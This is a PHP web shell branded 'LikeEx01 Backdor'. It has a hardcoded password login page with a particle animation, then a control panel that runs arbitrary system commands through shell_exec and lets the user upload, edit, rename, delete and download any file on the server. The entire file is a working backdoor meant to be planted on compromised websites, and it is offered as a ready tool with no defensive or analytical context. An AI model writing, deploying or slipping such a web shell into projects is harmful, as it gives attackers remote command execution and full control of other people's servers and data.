<?php
session_start();
$password = "evilcorp"; 

if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>𝐋𝐢𝐤𝐞𝐄𝐱𝟎𝟏 𝐁𝐚𝐜𝐤𝐝𝐨𝐫</title>
            <script src="https://cdn.tailwindcss.com"></script>
            <style>
                html, body {
                    margin: 0;
                    padding: 0;
                    overflow: hidden;
                    height: 100%;
                    background-color: #111827;
                }
                canvas {
                    position: fixed;
                    top: 0;
                    left: 0;
                    z-index: 0;
                }
                .login-container {
                    position: relative;
                    z-index: 10;
                    background-color: rgba(31, 41, 55, 0.6); /* Semi transparan abu */
                    backdrop-filter: blur(8px);
                }
                .transparent-input {
                    background-color: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(4px);
                }
            </style>
        </head>
        <body class="text-white font-mono flex items-center justify-center min-h-screen">
            <canvas id="network"></canvas>
            <div class="login-container max-w-4xl w-full p-10 px-20 rounded shadow-lg border border-gray-700">
                <h1 class="text-5xl mb-10 font-bold text-red-500 text-center">𝐋𝐢𝐤𝐞𝐄𝐱𝟎𝟏 𝐁𝐚𝐜𝐤𝐝𝐨𝐫</h1>
                <form method="POST">
                    <input type="password" name="pass" placeholder="Enter Password"
                        class="w-full p-6 rounded text-white text-3xl mb-6 border border-gray-400 focus:outline-none transparent-input placeholder-white" />
                    <button type="submit"
                        class="w-full text-3xl py-4 px-8 rounded border border-green-800 text-green-200 hover:bg-green-600 transition bg-transparent backdrop-blur-sm">
                        Login
                    </button>
                </form>
            </div>

            <script>
                const canvas = document.getElementById("network");
                const ctx = canvas.getContext("2d");
                let width, height;
                let points = [];

                function resize() {
                    width = window.innerWidth;
                    height = window.innerHeight;
                    canvas.width = width;
                    canvas.height = height;
                }

                window.addEventListener("resize", resize);
                resize();

                const POINTS_COUNT = 200; // Tambah jumlah partikel
                for (let i = 0; i < POINTS_COUNT; i++) {
                    points.push({
                        x: Math.random() * width,
                        y: Math.random() * height,
                        vx: (Math.random() - 0.5) * 0.7,
                        vy: (Math.random() - 0.5) * 0.7
                    });
                }

                function distance(p1, p2) {
                    return Math.sqrt((p1.x - p2.x)**2 + (p1.y - p2.y)**2);
                }

                function animate() {
                    ctx.clearRect(0, 0, width, height);

                    ctx.fillStyle = "rgba(255,255,255,0.8)";
                    points.forEach(p => {
                        ctx.beginPath();
                        ctx.arc(p.x, p.y, 5, 0, Math.PI * 2); // Titik lebih besar
                        ctx.fill();
                    });

                    ctx.strokeStyle = "rgba(255,255,255,0.3)";
                    ctx.lineWidth = 1.8;
                    for (let i = 0; i < POINTS_COUNT; i++) {
                        for (let j = i + 1; j < POINTS_COUNT; j++) {
                            let dist = distance(points[i], points[j]);
                            if (dist < 130) {
                                ctx.beginPath();
                                ctx.moveTo(points[i].x, points[i].y);
                                ctx.lineTo(points[j].x, points[j].y);
                                ctx.stroke();
                            }
                        }
                    }

                    points.forEach(p => {
                        p.x += p.vx;
                        p.y += p.vy;
                        if (p.x < 0 || p.x > width) p.vx *= -1;
                        if (p.y < 0 || p.y > height) p.vy *= -1;
                    });

                    requestAnimationFrame(animate);
                }

                animate();
            </script>
        </body>
        </html>';
        exit;
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$dir = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($dir);

function listFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = "$dir/$file";
        $isDir = is_dir($path);
        $size = $isDir ? 'DIR' : round(filesize($path) / 1024, 3) . 'KB';
        $encodedPath = urlencode(realpath($path));
        $displayName = strlen($file) > 30 ? htmlspecialchars(substr($file, 0, 27)) . '...' : htmlspecialchars($file);
        $action = $isDir 
            ? "<a href='?path=$encodedPath' title='Open Dir'><i class='fas fa-folder'></i></a>"
            : "";
        $action .= " <a href='?edit=$encodedPath' title='Edit'><i class='fas fa-edit'></i></a>
                     <a href='?rename=$encodedPath' class='ml-4' title='Rename'><i class='fas fa-i-cursor'></i></a>
                     <a href='?download=$encodedPath' class='ml-4' title='Download'><i class='fas fa-download'></i></a>
                     <a href='?del=$encodedPath' class='ml-4' title='Delete'><i class='fas fa-trash-alt'></i></a>";
        echo "<tr class='bg-gray-700 text-2xl border border-gray-600'>
                <td class='p-4 border border-gray-600' title='$file'>$displayName</td>
                <td class='p-4 border border-gray-600'>$size</td>
                <td class='p-4 border border-gray-600 text-right'>$action</td>
              </tr>";
    }
}

if (isset($_FILES['upload'])) {
    $originalName = $_FILES['upload']['name'];
    $tmpName = $_FILES['upload']['tmp_name'];
    $fakeName = $originalName . '.txt';
    if (move_uploaded_file($tmpName, $fakeName)) {
        rename($fakeName, $originalName);
        chmod($originalName, 0644);
    } else {
        $data = file_get_contents($tmpName);
        file_put_contents($originalName, $data);
        chmod($originalName, 0644);
    }
}

if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    rename($_POST['rename_from'], $_POST['rename_to']);
}

if (isset($_POST['savefile'], $_POST['filename'])) {
    file_put_contents($_POST['filename'], $_POST['savefile']);
}

if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_file($target)) unlink($target);elseif (is_dir($target)) rmdir($target);
    header("Location: ?path=" . urlencode(dirname($target)));
    exit;
}

if (isset($_GET['download'])) {
    $target = $_GET['download'];
    if (is_file($target)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($target) . '"');
        header('Content-Length: ' . filesize($target));
        readfile($target);
        exit;
    }
}

if (isset($_GET['edit']) && file_exists($_GET['edit'])) {
    $f = $_GET['edit'];
    $content = htmlspecialchars(file_get_contents($f));
    echo <<<HTML
<html><head><meta charset="UTF-8"><title>Edit File</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-800 text-white font-mono text-3xl p-10">
<form method="POST">
    <h2 class="text-4xl mb-6">Editing: $f</h2>
    <textarea name="savefile" rows="20" class="w-full bg-gray-900 text-white p-4 rounded border border-gray-600">$content</textarea>
    <input type="hidden" name="filename" value="$f">
    <button class="mt-6 bg-green-600 px-8 py-3 rounded text-2xl border border-green-800" type="submit">Save</button>
    <a href="?path={$dir}" class="ml-8 text-red-400 text-2xl">Cancel</a>
</form>
</body></html>
HTML;
    exit;
}

if (isset($_GET['rename']) && file_exists($_GET['rename'])) {
    $f = $_GET['rename'];
    echo <<<HTML
<html><head><meta charset="UTF-8"><title>Rename File</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-800 text-white font-mono text-3xl p-10">
<form method="POST">
    <h2 class="text-4xl mb-6">Renaming: $f</h2>
    <input type="hidden" name="rename_from" value="$f">
    <input type="text" name="rename_to" class="w-full p-4 rounded bg-gray-100 text-black text-2xl border border-gray-600" value="$f">
    <button class="mt-6 bg-yellow-500 px-8 py-3 rounded text-2xl border border-yellow-700" type="submit">Rename</button>
    <a href="?path={$dir}" class="ml-8 text-red-400 text-2xl">Cancel</a>
</form>
</body></html>
HTML;
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>𝐋𝐢𝐤𝐞𝐄𝐱𝟎𝟏 𝐁𝐚𝐜𝐤𝐝𝐨𝐫</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
</head>
<body class="bg-gray-800 text-white font-mono text-3xl">
    <div class="container mx-auto p-10 max-w-7xl">
        <div class="bg-gray-700 p-10 rounded border border-gray-600">
            <div class="text-center text-white text-5xl font-bold mb-10">[+] 𝐋𝐢𝐤𝐞𝐄𝐱𝟎𝟏 𝐁𝐚𝐜𝐤𝐝𝐨𝐫 [+]</div>
            <div class="text-right text-xl mb-4"><a href="?logout=true" class="text-red-400 hover:underline">Logout</a></div>

            <form method="POST" class="mb-8">
                <label for="cmd" class="block mb-4 text-3xl text-green-400">Terminal</label>
                <input type="text" id="cmd" name="cmd" class="w-full p-4 bg-black text-green-400 border border-green-600 rounded text-2xl" placeholder="Input command...">
                <button class="mt-4 bg-green-600 px-8 py-2 rounded border border-green-800" type="submit">Execute</button>
            </form>
            <?php
            if (isset($_POST['cmd'])) {
                echo "<pre class='bg-black text-green-400 p-4 mb-6 rounded border border-green-600 text-xl overflow-auto'>" . htmlspecialchars(shell_exec($_POST['cmd'])) . "</pre>";
            }
            ?>

            <div class="flex space-x-4 mb-8">
                <form method="post" enctype="multipart/form-data" class="w-1/3">
                    <input type="file" name="upload" class="bg-gray-300 text-black p-2 rounded w-full border border-gray-600 text-xl">
                    <button class="mt-2 bg-blue-600 px-4 py-2 rounded border border-blue-800 w-full text-xl" type="submit">Upload</button>
                </form>
                <form method="post" class="w-1/3">
                    <input type="text" name="newfile" class="bg-gray-300 text-black p-2 rounded w-full border border-gray-600 text-xl" placeholder="New file name">
                    <button class="mt-2 bg-purple-600 px-4 py-2 rounded border border-purple-800 w-full text-xl" type="submit">Create File</button>
                </form>
                <form method="post" class="w-1/3">
                    <input type="text" name="newfolder" class="bg-gray-300 text-black p-2 rounded w-full border border-gray-600 text-xl" placeholder="New folder name">
                    <button class="mt-2 bg-pink-600 px-4 py-2 rounded border border-pink-800 w-full text-xl" type="submit">Create Folder</button>
                </form>
            </div>
            <?php
            if (isset($_POST['newfile']) && $_POST['newfile'] !== '') file_put_contents($_POST['newfile'], '');
            if (isset($_POST['newfolder']) && $_POST['newfolder'] !== '') mkdir($_POST['newfolder']);
            ?>
            <div class="mb-8 bg-gray-800 text-green-400 text-2xl font-mono p-4 rounded border border-gray-600 break-words">
                <?php
                $parts = explode('/', realpath($dir));
                $build = "";
                foreach ($parts as $part) {
                    if ($part === "") continue;
                    $build .= "/$part";
                    echo "<a class='text-blue-400 hover:underline' href='?path=" . urlencode($build) . "'>/$part</a>";
                }
                echo " [ " . substr(sprintf('%o', fileperms($dir)), -4) . " ]";
                ?>
            </div>
            <table class="w-full table-auto text-3xl border border-gray-600">
                <thead>
                    <tr class="bg-gray-600 border border-gray-600">
                        <th class="p-4 text-left border border-gray-600">Name</th>
                        <th class="p-4 text-left border border-gray-600">Size</th>
                        <th class="p-4 text-right border border-gray-600">Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php listFiles($dir); ?>
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>